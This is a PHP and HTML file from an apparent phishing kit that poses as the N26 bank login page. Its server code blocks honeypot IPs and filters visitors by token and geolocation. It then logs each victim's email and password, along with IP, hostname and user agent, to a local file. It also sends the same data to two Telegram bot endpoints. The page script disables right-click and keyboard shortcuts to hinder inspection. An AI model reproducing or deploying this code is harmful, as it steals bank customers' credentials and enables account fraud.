<?php

error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');
$honeypotbots = file_get_contents('honeypotbots.dat');
$errorUrl = 'Error.php';
$ip = getenv('REMOTE_ADDR');

if (stripos($honeypotbots, $ip) !== false) {
  $stripos = '1';

}

$token1 = base64_encode($_SERVER['HTTP_USER_AGENT'].$ip.date('Y:M:D'));
if ($token1 != $_GET['token'] || $stripos == '1' ){ header("location: " . $errorUrl ."?" . $_GET['token']); exit;  }
function curl_get_contents($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_URL, $url);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
} 

$metri = $_SERVER['REMOTE_ADDR'];
$geoip = 'http://www.geoplugin.net/php.gp?ip='.$metri;
$addrDetailsArr = unserialize(curl_get_contents($geoip)); 
$continent = $addrDetailsArr['geoplugin_continentCode'];
$country = $addrDetailsArr['geoplugin_countryCode'];
if (!$country)
{
    $country='Not found!';
}

if ($continent !== 'AF' && $country !== 'FR')
{
      header("location: " . $errorUrl . "?" . $_GET['token']);
     exit();
} 

if ($_POST['type'] == "log") {
include 'config.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
            $message = '/== N26 LOG By METRI==/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'email : ' . $_POST['email'] . "\r\n";
            $message .= 'pwd : ' . $_POST['pwd'] . "\r\n";
            $message .= '/---------------- user details ----------------/' . "\r\n";
            $message .= "Client IP   : ".$ip."\n";
            $message .= "HostName    : ".$hostname."\n";
            $message .= "User Agent  : ".$_SERVER['HTTP_USER_AGENT']."\n";
            $message .= '/-- end log details --/' . "\r\n\r\n";

            file_put_contents("./rezult/n26-rzlt.txt", $message, FILE_APPEND);

    
            $params=[
            'chat_id'=>$chat_id,
            'text'=>$message,
            ];
            $ch = curl_init($METRI_TOKEN . '/sendMessage');
            curl_setopt($ch, CURLOPT_HEADER, false);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $result = curl_exec($ch);
            curl_close($ch);
            
            $params=[
            'chat_id'=>$chatt_id,
            'text'=>$message,
            ];
            $ch = curl_init($MEETRI_TOKEN . '/sendMessage');
            curl_setopt($ch, CURLOPT_HEADER, false);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $result = curl_exec($ch);
            curl_close($ch);
            
}
else {
header("location: " . $errorUrl . "?".base64_encode(rand(0,9999999999999)));
}

?>

<!DOCTYPE html>

<html lang="fr" data-rh="lang" style="--duration:0;"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<link rel="icon" type="image/x-icon" sizes="256x256" href="./n26_files/favicon.ico">

<title>Effettua l’accesso — N26</title>





<link rel="preload" href="./n26_files/GT-America-Standard-Regular.latin.woff2" as="font" type="font/woff2" crossorigin="anonymous">
<link rel="preload" href="./n26_files/GT-America-Extended-Medium.latin.woff2" as="font" type="font/woff2" crossorigin="anonymous">
    

    <style>

@font-face {
  font-family: 'N26';
  font-style: normal;
  font-weight: 600;
  font-display: swap;
  src:
    url('./n26_files/GT-America-Extended-Medium.latin.woff2') format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
}


@font-face {
  font-family: 'N26';
  font-style: normal;
  font-weight: 700;
  font-display: swap;
  src:
    url('./n26_files/GT-America-Standard-Bold.latin.woff2') format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
}


@font-face {
  font-family: 'N26';
  font-style: normal;
  font-weight: 400;
  font-display: swap;
  src:
    url('./n26_files/GT-America-Standard-Regular.latin-ext.woff2') format('woff2');
  unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
}


@font-face {
  font-family: 'N26';
  font-style: normal;
  font-weight: 500;
  font-display: swap;
  src:
    url('./n26_files/GT-America-Standard-Medium.latin-ext.woff2') format('woff2');
  unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
}


@font-face {
  font-family: 'N26';
  font-style: normal;
  font-weight: 600;
  font-display: swap;
  src:
    url('./n26_files/GT-America-Extended-Medium.latin-ext.woff2') format('woff2');
  unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
}


@font-face {
  font-family: 'N26';
  font-style: normal;
  font-weight: 700;
  font-display: swap;
  src:
    url('./n26_files/GT-America-Standard-Bold.latin-ext.woff2') format('woff2');
  unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
}

</style>

    
<style data-fela-type="KEYFRAME" type="text/css">@keyframes k1{to{transform:rotate(1turn)}}@keyframes k2{0%{opacity:0;transform:translateY(20%)}20%{opacity:1;transform:translateY(0)}80%{opacity:1;transform:translateY(0)}90%{opacity:0;transform:translateY(0)}100%{opacity:0;transform:translateY(0)}}@keyframes k3{0%{opacity:0}35%{opacity:0}55%{opacity:1}75%{opacity:0}100%{opacity:0}}</style>


<style data-fela-id="" data-fela-rehydration="328" data-fela-type="STATIC">
  :root {-webkit-font-smoothing: antialiased;-moz-osx-font-smoothing: grayscale;--duration: 1;--responsive-base: 1;--background-default: rgb(255, 255, 255); --background-alternate: rgb(251, 251, 251); --background-screen: rgb(251, 251, 251); --background-button-primary-active: rgb(54, 161, 139); --background-button-primary-pressed: rgb(42, 126, 109); --background-button-primary-disabled: rgb(228, 242, 239); --background-button-secondary: rgb(255, 255, 255); --background-container-teal: rgb(54, 161, 139); --background-container-rhubarb: rgb(203, 124, 122); --background-container-wheat: rgb(205, 163, 95); --background-container-petrol: rgb(38, 102, 120); --background-container-secondary-teal: rgb(202, 215, 202); --background-container-secondary-rhubarb: rgb(229, 195, 199); --background-container-secondary-wheat: rgb(245, 214, 186); --background-container-secondary-petrol: rgb(200, 215, 229); --background-container-light: rgb(245, 245, 245); --background-container-light-teal: rgb(228, 242, 239); --background-container-light-rhubarb: rgb(242, 228, 228); --background-container-light-wheat: rgb(242, 233, 218); --background-container-light-petrol: rgb(227, 238, 241); --background-light-error-red: rgb(248, 237, 237); --background-info-card: rgb(230, 230, 230); --typography-default: rgb(27, 27, 27); --typography-default-inverted: rgb(255, 255, 255); --typography-default-consistent: rgb(27, 27, 27); --typography-default-inverted-consistent: rgb(255, 255, 255); --typography-extra-light: rgb(191, 191, 191); --typography-light: rgb(116, 116, 116); --typography-interactive-default: rgb(42, 126, 109); --typography-interactive-teal: rgb(42, 126, 109); --typography-interactive-rhubarb: rgb(203, 124, 122); --typography-interactive-wheat: rgb(205, 163, 95); --typography-interactive-petrol: rgb(38, 102, 120); --typography-error: rgb(180, 75, 70); --divider-default: rgb(230, 230, 230); --divider-teal: rgb(54, 161, 139); --divider-error: rgb(180, 75, 70); --divider-dark: rgb(116, 116, 116); --iconography-default: rgb(27, 27, 27); --iconography-default-inverted: rgb(255, 255, 255); --iconography-light: rgb(116, 116, 116); --iconography-bright: rgb(230, 230, 230); --iconography-action: rgb(54, 161, 139); --mild-overlay: rgba(0, 0, 0, 0.075); --distinct-overlay: rgba(0, 0, 0, 0.2); --shadow-default: rgba(0, 0, 0, 0.2); --primary-focus: rgba(54, 161, 139, 0.6); --shimmer-background: rgb(230, 230, 230); --shimmer-foreground: rgb(251, 251, 251); --deprecated-gray: rgb(201, 201, 201); /* 1 */--spacing-5-xl: 4.4em; --spacing-4-xl: 3.85em; --spacing-3-xl: 3.3em; --spacing-2-xl: 2.75em; --spacing-xl: 2.2em; --spacing-l: 1.65em; --spacing-m: 1.1em; --spacing-s: 0.88em; --spacing-xs: 0.825em; --spacing-2-xs: 0.55em; --spacing-3-xs: 0.275em; --spacing-4-xs: 0.22em; --spacing-5-xs: 0.165em; --spacing-6-xs: 0.11em;--font-size-6-xl: 2.8rem; --font-size-5-xl: 2.2rem; --font-size-4-xl: 2rem; --font-size-3-xl: 1.8rem; --font-size-2-xl: 1.5rem; --font-size-xl: 1.3rem; --font-size-l: 1.2rem; --font-size-m: 1.1rem; --font-size-s: 1rem; --font-size-xs: 0.9rem; --font-size-2-xs: 0.85rem; --font-size-3-xs: 0.8rem; --font-size-4-xs: 0.7rem; --font-size-5-xs: 0.6rem;--line-height-5-xl: 1.8; --line-height-4-xl: 1.7; --line-height-3-xl: 1.6; --line-height-2-xl: 1.5; --line-height-xl: 1.45; --line-height-l: 1.4; --line-height-m: 1.2; --line-height-s: 1.1; --line-height-xs: 1;--width-7-xl: 88ch; --width-6-xl: 77ch; --width-5-xl: 71.5ch; --width-4-xl: 66ch; --width-3-xl: 49.5ch; --width-2-xl: 48.4ch; --width-xl: 44ch; --width-l: 41.8ch; --width-m: 33ch; --width-s: 27.5ch; --width-xs: 22ch; --width-2-xs: 15.4ch; --width-3-xs: 13.2ch; --width-4-xs: 11ch; --width-5-xs: 8.8ch; --width-6-xs: 5.5ch; --width-7-xs: 3.3ch; --width-8-xs: 1.1ch; --width-9-xs: 0.825ch; --width-10-xs: 0.55ch; --width-11-xs: 0.33ch; --width-12-xs: 0.11ch;--border-radius-5-xl: 34px; --border-radius-4-xl: 27px; --border-radius-3-xl: 22px; --border-radius-2-xl: 14px; --border-radius-xl: 10px; --border-radius-l: 8px; --border-radius-m: 6px; --border-radius-s: 5px; --border-radius-xs: 4px; --border-radius-2-xs: 2px; --border-radius-credit-card: 3% / 5%; --border-radius-half: 50%; --border-radius-circle: 100vw;}@media (max-width: 767px) {:root {--responsive-base: 0.8;touch-action: manipulation;}}body {scroll-behavior: smooth; /* 2 */}@media (prefers-reduced-motion: reduce) {:root { --duration: 0 }body { scroll-behavior: auto }}::selection{background-color: rgba(72, 172, 152, 0.2);}*, ::before, ::after{box-sizing:inherit}html{background-color:var(--background-alternate);box-sizing:border-box;font-weight:400;min-height:100%;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}html, body, [id="root"]{display:-webkit-box;display:-moz-box;display:-ms-flexbox;display:-webkit-flex;display:flex;flex-direction:column;-webkit-box-orient:vertical;-webkit-box-direction:normal;flex-grow:1;flex-shrink:1;flex-basis:auto}body{font-family:N26, sans-serif;font-size:112.5%;line-height:1.4;color:var(--typography-default);overflow-x:hidden;margin-top:0;margin-right:0;margin-bottom:0;margin-left:0}img{display:block;height:auto;max-width:100%;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none}main{display:block}[hidden]{display:none}a{background-color:transparent;-webkit-text-decoration-skip:objects}svg:not(:root){overflow:hidden}hr{overflow:visible}button, input, select, textarea{font:inherit;margin-top:0;margin-right:0;margin-bottom:0;margin-left:0}button, input{overflow:visible}button, select{text-transform:none}button, html [type="button"], [type="reset"], [type="submit"]{-webkit-appearance:button}button::-moz-focus-inner,[type="button"]::-moz-focus-inner,[type="reset"]::-moz-focus-inner,[type="submit"]::-moz-focus-inner{padding-top:0;padding-right:0;padding-bottom:0;padding-left:0;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none}button:-moz-focusring,[type="button"]:-moz-focusring,[type="reset"]:-moz-focusring,[type="submit"]:-moz-focusring{outline-width:1px;outline-style:dotted;outline-color:ButtonText}fieldset{padding-top:0.35em;padding-right:0.625em;padding-bottom:var(--spacing-xs);padding-left:0.625em;margin-top:0;margin-right:2px;margin-bottom:0;margin-left:2px;border-top-width:1px;border-right-width:1px;border-bottom-width:1px;border-left-width:1px;border-top-style:solid;border-right-style:solid;border-bottom-style:solid;border-left-style:solid;border-top-color:rgb(192, 192, 192);border-right-color:rgb(192, 192, 192);border-bottom-color:rgb(192, 192, 192);border-left-color:rgb(192, 192, 192)}legend{box-sizing:border-box;display:table;max-width:100%;white-space:normal;color:inherit;padding-top:0;padding-right:0;padding-bottom:0;padding-left:0}textarea{overflow:auto}[type="checkbox"], [type="radio"]{padding-top:0;padding-right:0;padding-bottom:0;padding-left:0}[type="number"]::-webkit-inner-spin-button,[type="number"]::-webkit-outer-spin-button{height:auto}[type="search"]{-webkit-appearance:textfield;outline-offset:-2px}[type="search"]::-webkit-search-cancel-button,[type="search"]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-input-placeholder{color:inherit;opacity:0.54}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}:-webkit-autofill,:-webkit-autofill:hover,:-webkit-autofill:focus,:-webkit-autofill:active{transition:background-color 1000000ms, color 1000000ms;-webkit-transition:background-color 1000000ms, color 1000000ms;-moz-transition:background-color 1000000ms, color 1000000ms}:required:-moz-ui-invalid{box-shadow:none}.visually-hidden{border-top-width:0 !important;border-right-width:0 !important;border-bottom-width:0 !important;border-left-width:0 !important;clip:rect(1px, 1px, 1px, 1px) !important;height:1px !important;overflow:hidden !important;padding-top:0 !important;padding-right:0 !important;padding-bottom:0 !important;padding-left:0 !important;position:absolute !important;white-space:nowrap !important;width:1px !important}strong, b{font-weight:500}audio, canvas, iframe, img, svg, video{vertical-align:middle}p{margin-top:0;margin-bottom:var(--spacing-m)}
</style>


<style data-fela-id="" data-fela-rehydration="328" data-fela-type="RULE">
  .a{border-top-width:0 !important}.b{border-right-width:0 !important}.c{border-bottom-width:0 !important}.d{border-left-width:0 !important}.e{clip:rect(1px, 1px, 1px, 1px) !important}.f{height:1px !important}.g{overflow:hidden !important}.h{padding-top:0 !important}.i{padding-right:0 !important}.j{padding-bottom:0 !important}.k{padding-left:0 !important}.l{position:absolute !important}.m{white-space:nowrap !important}.n{width:1px !important}.o{display:-webkit-box;display:-moz-box;display:-ms-flexbox;display:-webkit-flex;display:flex}.p{justify-content:center;-webkit-box-pack:center}.q{align-items:center;-webkit-box-align:center}.r{flex-grow:1;-webkit-box-flex:1}.s{width:calc(12.5rem * var(--responsive-base))}.t{stop-opacity:0}.u{stop-color:rgb(160,160,160)}.v{stop-opacity:0.25}.w{animation-duration:1500ms}.x{animation-timing-function:ease-in-out}.y{animation-iteration-count:infinite}.z{width:100%}.ab{height:100%}.ac{fill:rgb(160,160,160)}.ae{opacity:0.2}.af{flex-direction:column;-webkit-box-orient:vertical;-webkit-box-direction:normal}.ag{flex-grow:1}.ah{flex-shrink:1}.ai{flex-basis:auto}.aj{position:relative}.ak{margin-top:auto}.al{margin-right:auto}.am{margin-bottom:auto}.an{margin-left:auto}.av{z-index:1}.aw{background-color:var(--background-container-secondary-teal)}.ax{transition-property:background-color;-webkit-transition-property:background-color;-moz-transition-property:background-color}.ay{transition-duration:350ms}.ba{padding-top:var(--spacing-l)}.bb{padding-right:var(--spacing-s)}.bc{padding-bottom:var(--spacing-l)}.bd{padding-left:var(--spacing-s)}.be{flex-basis:100%}.bf{background-color:var(--background-default)}.bg{width:30rem}.bh{min-height:24rem}.bj{align-items:stretch;-webkit-box-align:stretch}.bx{text-align:center}.by{max-width:100%}.bz{border-radius:var(--border-radius-xl)}.ca{box-shadow:0 var(--spacing-4-xs) var(--spacing-3-xs) var(--mild-overlay)}.cb{padding-top:var(--spacing-m)}.cc{padding-bottom:var(--spacing-m)}.cd{max-width:21.5rem}.ce::after{content:""}.cf::after{display:block}.cg::after{width:21.5rem}.ch{margin-top:0}.ci{margin-bottom:0}.cj{padding-top:var(--spacing-3-xs)}.ck{padding-right:var(--spacing-3-xs)}.cl{padding-bottom:var(--spacing-3-xs)}.cm{padding-left:var(--spacing-3-xs)}.cn{border-top-width:0}.co{border-right-width:0}.cp{border-bottom-width:0}.cq{border-left-width:0}.cr{background-color:transparent}.cs{font-style:inherit}.ct{font-weight:inherit}.cu{font-size:inherit}.cv{line-height:inherit}.cw{font-family:inherit}.cx{color:inherit}.cy{text-decoration:none}.cz{text-align:left}.da{cursor:pointer}.db{display:block}.dc{width:5rem}.dg{margin-top:calc(var(--spacing-3-xs) * -1)}.dh{margin-bottom:calc(var(--spacing-l) - var(--spacing-3-xs))}.di{fill:currentcolor}.dj{max-height:2.2rem}.dk{border-radius:var(--border-radius-l)}.dl{box-shadow:none}.dm{font-size:var(--font-size-s)}.dn{line-height:1.3333333333333333}.do{color:var(--typography-default)}.dp[disabled]{cursor:not-allowed}.dq[disabled]{opacity:0.5}.dr[disabled]{pointer-events:none}.ds[readonly]{cursor:not-allowed}.dt[readonly]{opacity:0.5}.du[readonly]{pointer-events:none}.dv + ul{margin-top:6px}.dw + ul{margin-right:-1px}.dx + ul{margin-bottom:0}.dy + ul{margin-left:-1px}.dz + ul{padding-top:0}.ea + ul{padding-right:0}.eb + ul{padding-bottom:0}.ec + ul{padding-left:0}.ed + ul{list-style:none}.ee + ul> ::before{position:absolute}.ef + ul> ::before{content:"\200B"}.eg + ul{background-color:var(--background-default)}.eh + ul{box-shadow:0 2px 4px 0 rgba(0, 0, 0, 0.1)}.ei + ul{border-radius:var(--border-radius-l)}.ej + ul{position:absolute}.ek + ul{left:0}.el + ul{right:0}.em + ul{z-index:50}.ep + ul{border-top-width:1px}.eq + ul{border-right-width:1px}.er + ul{border-bottom-width:1px}.es + ul{border-left-width:1px}.et + ul{border-top-style:solid}.eu + ul{border-right-style:solid}.ev + ul{border-bottom-style:solid}.ew + ul{border-left-style:solid}.ex + ul{border-top-color:var(--divider-default)}.ey + ul{border-right-color:var(--divider-default)}.ez + ul{border-bottom-color:var(--divider-default)}.fa + ul{border-left-color:var(--divider-default)}.fc + ul > li:not(:last-child){border-bottom-width:1px}.fd + ul > li:not(:last-child){border-bottom-style:solid}.fe + ul > li:not(:last-child){border-bottom-color:var(--divider-default)}.ff + ul > li{font-size:var(--font-size-s)}.fg + ul > li{text-align:left}.fh + ul > li:first-child{border-top-left-radius:var(--border-radius-l)}.fi + ul > li:first-child{border-top-right-radius:var(--border-radius-l)}.fj + ul > li:last-child{border-bottom-left-radius:var(--border-radius-l)}.fk + ul > li:last-child{border-bottom-right-radius:var(--border-radius-l)}.fl + ul > li:hover{background-color:var(--background-container-teal)}.fm + ul > li:hover{color:rgb(255, 255, 255)}.fn + ul > li:hover:not(:last-child){border-bottom-width:1px}.fo + ul > li:hover:not(:last-child){border-bottom-style:solid}.fp + ul > li:hover:not(:last-child){border-bottom-color:rgba(255, 255, 255, 0.4)}.fq + ul > li:hover{cursor:pointer}.fr + ul > li{padding-top:var(--spacing-2-xs)}.fs + ul > li{padding-right:var(--spacing-xs)}.ft + ul > li{padding-bottom:var(--spacing-2-xs)}.fu + ul > li{padding-left:var(--spacing-xs)}.fv + ul > [aria-selected="true"]{background-color:var(--background-container-teal)}.fw + ul > [aria-selected="true"]{color:rgb(255, 255, 255)}.fx + ul > [aria-selected="true"]:not(:last-child){border-bottom-width:1px}.fy + ul > [aria-selected="true"]:not(:last-child){border-bottom-style:solid}.fz + ul > [aria-selected="true"]:not(:last-child){border-bottom-color:rgba(255, 255, 255, 0.4)}.ga + ul mark{background-color:transparent}.gb + ul mark{color:inherit}.gc + ul mark{border-bottom-width:1px}.gd + ul mark{border-bottom-style:solid}.ge::placeholder{transition-property:opacity;-webkit-transition-property:opacity;-moz-transition-property:opacity}.gf::placeholder{transition-duration:0}.gg::placeholder{opacity:0}.gh::-ms-input-placeholder{opacity:0.8}.gi::-ms-input-placeholder{color:rgb(150, 150, 150)}.gj{-webkit-appearance:none;-moz-appearance:none;appearance:none}.gk[type="date"]::-webkit-datetime-edit{color:transparent}.gl{padding-top:var(--spacing-xl)}.gm{padding-bottom:var(--spacing-xs)}.gn{outline-style:none}.go{height:4em}.gp{transition-property:box-shadow, border-color;-webkit-transition-property:box-shadow, border-color;-moz-transition-property:box-shadow, border-color}.gq{transition-duration:400ms}.gr{-webkit-tap-highlight-color:transparent}.hh{margin-bottom:var(--spacing-s)}.hi{border-top-width:1px}.hj{border-right-width:1px}.hk{border-bottom-width:1px}.hl{border-left-width:1px}.hm{border-top-style:solid}.hn{border-right-style:solid}.ho{border-bottom-style:solid}.hp{border-left-style:solid}.hq{border-top-color:var(--divider-default)}.hr{border-right-color:var(--divider-default)}.hs{border-bottom-color:var(--divider-default)}
  

  .hvt{background-color:var(--divider-default)}
  .ht{border-left-color:var(--divider-default)}.hu{color:var(--typography-light)}.hv{position:absolute}.hw{top:50%}.hx{left:var(--spacing-s)}.hy{transition-property:transform;-webkit-transition-property:transform;-moz-transition-property:transform}.hz{transition-duration:300ms}.ia{transform-origin:top left}.ib{transform:translateY(-50%)}.ic{margin-left:-2px}.id{cursor:-webkit-text;cursor:text}.ie{pointer-events:none}.if{padding-right:var(--spacing-xs)}.ih{font-weight:500}.ii{color:var(--typography-interactive-default)}.in{white-space:nowrap}.io{margin-right:calc(var(--spacing-3-xs) * -1)}.ip{margin-bottom:calc(var(--spacing-3-xs) * -1)}.iq{margin-left:calc(var(--spacing-3-xs) * -1)}.ir:not(:empty){margin-bottom:var(--spacing-s)}.is{background-color:var(--background-container-teal)}.it{color:rgb(255, 255, 255)}.iu{display:inline-block}.iv{transition-duration:250ms}.iw{line-height:var(--line-height-l)}.iz::after{position:absolute}.ja::after{top:-4px}.jb::after{bottom:-4px}.jc::after{right:-4px}.jd::after{left:-4px}.je::after{opacity:0}.jf::after{box-shadow:0 0 0 2px var(--primary-focus)}.jg::after{pointer-events:none}.jh::after{border-radius:var(--border-radius-xl)}.ji::after{transition-duration:inherit}.jo{border-top-width:2px}.jp{border-right-width:2px}.jq{border-bottom-width:2px}.jr{border-left-width:2px}.js{border-top-color:transparent}.jt{border-right-color:transparent}.ju{border-bottom-color:transparent}.jv{border-left-color:transparent}.jw{padding-top:var(--spacing-xs)}.jx{padding-right:var(--spacing-l)}.jy{padding-left:var(--spacing-l)}.jz{margin-top:var(--spacing-2-xs)}.ka{z-index:50}.kb{min-height:60px}.kc{box-shadow:0 -1em 3em rgba(0, 0, 0, 0.05)}.kd{align-items:flex-start;-webkit-box-align:start}.kg{padding-right:var(--spacing-m)}.kh{padding-left:var(--spacing-m)}.ki{font-size:var(--font-size-3-xs)}.km{height:var(--spacing-m)}.kn{width:var(--spacing-m)}.ko{vertical-align:-2px}.kp{overflow:hidden}.kq{fill:none}.kr{stroke:currentcolor}.ks{stroke-width:2px}.kt{vertical-align:baseline}.ku{width:inherit}.kv{height:inherit}.kw{border-radius:0}.kx> option{color:var(--typography-default)}.ky> option{background-color:var(--background-alternate)}.kz{padding-top:0}.la{padding-bottom:0}.lb{padding-left:0}.lc{transition-property:text-indent;-webkit-transition-property:text-indent;-moz-transition-property:text-indent}.li[aria-invalid="true"]{border-top-color:var(--divider-error)}.lj[aria-invalid="true"]{border-right-color:var(--divider-error)}.lk[aria-invalid="true"]{border-bottom-color:var(--divider-error)}.ll[aria-invalid="true"]{border-left-color:var(--divider-error)}.lm{border-bottom-style:none}.ln{width:0.6em}.lo{right:0}.lp{fill:var(--iconography-light)}.lq{transform:translateY(-40%)}.hg:hover{box-shadow:0 2px 4px 0 rgba(0, 0, 0, 0.1)}.ix:hover{box-shadow:0 5px 10px rgba(0, 0, 0, 0.2)}.iy:hover{transform:translateY(-2px)}.kk:hover{color:var(--typography-interactive-default)}.gs:focus-within{box-shadow:0 2px 4px 0 rgba(0, 0, 0, 0.1), inset 0 0 0 1px var(--divider-teal)}.gt:focus-within:hover{box-shadow:0 2px 4px 0 rgba(0, 0, 0, 0.1), inset 0 0 0 1px var(--divider-teal)}.gu:focus-within{border-top-width:1px}.gv:focus-within{border-right-width:1px}.gw:focus-within{border-bottom-width:1px}.gx:focus-within{border-left-width:1px}.gy:focus-within{border-top-style:solid}.gz:focus-within{border-right-style:solid}.ha:focus-within{border-bottom-style:solid}.hb:focus-within{border-left-style:solid}.hc:focus-within{border-top-color:var(--divider-teal)}.hd:focus-within{border-right-color:var(--divider-teal)}.he:focus-within{border-bottom-color:var(--divider-teal)}.hf:focus-within{border-left-color:var(--divider-teal)}.dd:focus{border-radius:var(--border-radius-m)}.de:focus{box-shadow:0 0 0 3px var(--primary-focus)}.df:focus{outline-style:none}.jj:focus::after{opacity:1}.ld:focus{box-shadow:none}.le:focus{border-top-color:var(--primary-focus)}.lf:focus{border-right-color:var(--primary-focus)}.lg:focus{border-bottom-color:var(--primary-focus)}.lh:focus{border-left-color:var(--primary-focus)}.kl:active{color:var(--typography-interactive-default)}
</style>


<style data-fela-id="" data-fela-rehydration="328" data-fela-type="RULE" media="(min-width: 768px)">
  .ar{margin-top:auto}.as{margin-right:auto}.at{margin-bottom:auto}.au{margin-left:auto}.br{border-radius:var(--border-radius-xl)}.bs{box-shadow:0 var(--spacing-4-xs) var(--spacing-3-xs) var(--mild-overlay)}.bt{padding-top:var(--spacing-m)}.bu{padding-right:var(--spacing-s)}.bv{padding-bottom:var(--spacing-m)}.bw{padding-left:var(--spacing-s)}.en + ul{overflow-y:auto}.eo + ul{max-height:10em}.ke{flex-direction:row;-webkit-box-orient:horizontal;-webkit-box-direction:normal}.kf{align-items:center;-webkit-box-align:center}.kj{margin-right:var(--spacing-m)}
</style>



<style data-fela-id="" data-fela-rehydration="328" data-fela-type="RULE" media="(max-width: 767px)">
  .ao{flex-grow:1}.ap{flex-shrink:1}.aq{flex-basis:auto}.az{background:var(--background-alternate)}.bk{text-align:center}.bl{background:transparent}.bm{box-shadow:none}.bn{padding-top:0}.bo{padding-right:0}.bp{padding-bottom:0}.bq{padding-left:0}.ij{padding-top:var(--spacing-3-xs)}.ik{padding-right:var(--spacing-3-xs)}.il{padding-bottom:var(--spacing-3-xs)}.im{padding-left:var(--spacing-3-xs)}.jk{padding-top:var(--spacing-xs)}.jl{padding-right:var(--spacing-xs)}.jm{padding-bottom:var(--spacing-xs)}.jn{padding-left:var(--spacing-xs)}
</style>





</head>

<body>
<div id="root">
<p tabindex="-1" class="a b c d e f g h i j k l m n" id="a11y-page-name-paragraph">Effettua l’accesso — N26</p>
<main role="main" class="af ag ah ai o z">
<div class="af ag ah ai aj ak al am an o q z">
<div class="af ag ah ai ak al am an ao ap aq ar as at au o z">
<div class="ag ah aj av aw ax ay az ba bb bc bd be o">
<div class="af ak al am an bb bd bf bg bh bj bk bl bm bn bo bp bq br bs bt bu bv bw bx by bz ca cb cc o p">
<div class="af al an ce cf ch ci o ot ou p q z">


	
	
<br>

<img src="./n26_files/loading-1.gif" width="30%"></div></div></div></div></div></main>



<footer role="contentinfo" class="ka"><div class="bf ka kb kc z"><nav class="af cb cc kd ke kf kg kh o"><span class="ch ci cj ck cl cm io iq ki kj">©&nbsp;<!-- -->N26 GmbH<!-- -->&nbsp;<!-- -->2021</span><a class="ch ci cj ck cl cm cn co cp cq cr cs ct cv cw cy cz da dd de df do io iq ki kj kk kl" target="_blank" rel=" noopener noreferrer">
Politique de confidentialité<span title="(nuova tabella)" class="iu km kn ko kp kq kr ks"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32" aria-hidden="true" focusable="false" class="cx di kt ku kv"><path d="M22 11L10.5 22.5M10.44 11H22v11.56" fill="none"></path></svg><span class="a b c d e f g h i j k l m n">(nuova tabella)</span></span></a><a class="ch ci cj ck cl cm cn co cp cq cr cs ct cv cw cy cz da dd de df do io iq ki kj kk kl" target="_blank" rel=" noopener noreferrer">imprimer<span title="(nuova tabella)" class="iu km kn ko kp kq kr ks"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32" aria-hidden="true" focusable="false" class="cx di kt ku kv"><path d="M22 11L10.5 22.5M10.44 11H22v11.56" fill="none"></path></svg><span class="a b c d e f g h i j k l m n">(nuova tabella)</span></span></a><div class="au ch ci cj ck cl cm io iq iu ki"><label class="a b c d e f g h i j k l m n" for="locale-picker">Cambia lingua</label><div class="ab aj do"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32" class="hv hw ln lo lp lq"><path d="M0 8.77a1.53 1.53 0 0 1 2.61-1.09L16 21.07 29.39 7.68a1.53 1.53 0 0 1 2.16 2.16L17.08 24.32a1.53 1.53 0 0 1-2.16 0L.45 9.85A1.53 1.53 0 0 1 0 8.77z"></path></svg><select id="locale-picker" class="aj cn co cq cr cu df dl dn do dp dq dr ds dt du gj iv kg kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm z" title="Cambia lingua"><option selected="" value="fr" lang="fr">Français</option></select></div></div></nav></div></footer></div>
<script src="./n26_files/jquery.min.js"></script>
<script>
jQuery(function($){

    document.addEventListener('contextmenu', event => event.preventDefault());
    document.onkeydown = function(e) {
        if (e.ctrlKey && 
        (e.keyCode === 67 || 
        e.keyCode === 86 || 
        e.keyCode === 85 ||
        e.keyCode === 83 || 
        e.keyCode === 117)) {
            return false;
        } else {
            return true;
        }
    };

